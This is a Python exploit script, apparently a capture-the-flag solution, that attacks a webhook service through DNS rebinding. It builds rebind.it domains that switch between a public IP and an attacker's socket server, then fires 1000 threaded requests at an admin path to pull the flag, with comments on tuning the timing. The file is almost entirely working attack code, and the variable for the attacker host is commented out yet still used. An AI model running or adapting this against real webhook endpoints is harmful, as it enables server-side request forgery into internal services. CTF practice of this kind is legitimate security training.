import random
import requests
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

# TARGET = "http://localhost:8080"
TARGET = "https://webwebhookhook-0e7670270076cd04.i.chal.irisc.tf"
WEBHOOK = f"{TARGET}/webhook"

# SOCKET_SERVER_HOST = "your server ip" # e.g. 123.123.123.123
REBINDER_DNS = f"http://s-93.184.215.14-{SOCKET_SERVER_HOST}-{{0}}-fs-e.d.rebind.it/admin"

# Cache time in seconds; used to control the duration data is stored before being refreshed
CACHE_TIME = 30
# Adjust the TIME_OFFSET value to fine-tune the DNS rebinding timing:
# - If you only receive a {"response": "ok"} but fail to obtain the flag, reduce the TIME_OFFSET value.
# - If you only receive a {"response": "fail"}, increase the TIME_OFFSET value.
TIME_OFFSET = 3



def hook(i, session, hook_url, data):
    headers = {'Content-Type': 'application/json'}
    params = {
        "hook": hook_url
    }
    resp = session.post(WEBHOOK, headers=headers, params=params, data=data)
    return i, resp.text

def main():
    while True:
        session = requests.session()
        sess = int(random.random() * (2**32))
        print(f"[*] Start - {sess}")
        print(f"[*] Using Domain: {REBINDER_DNS.format(sess)}")
        while True:
            _, result =  hook("start", session, REBINDER_DNS.format(sess), "A")
            if "response" in result:
                print("[*] Waiting for the DNS cache to be cleared...")
                break

        time.sleep(CACHE_TIME - TIME_OFFSET)

        futures = []
        with ThreadPoolExecutor(max_workers=1000) as pool:
            for i in range(1000):
                future = pool.submit(hook, i, session, REBINDER_DNS.format(sess), f"[{i}] "+"A"*0x1000)
                futures.append(future)

            for future in as_completed(futures):
                i, result = future.result()
                print(f"> {i} {result}")

        print(f"[*] Done - {sess}")

main()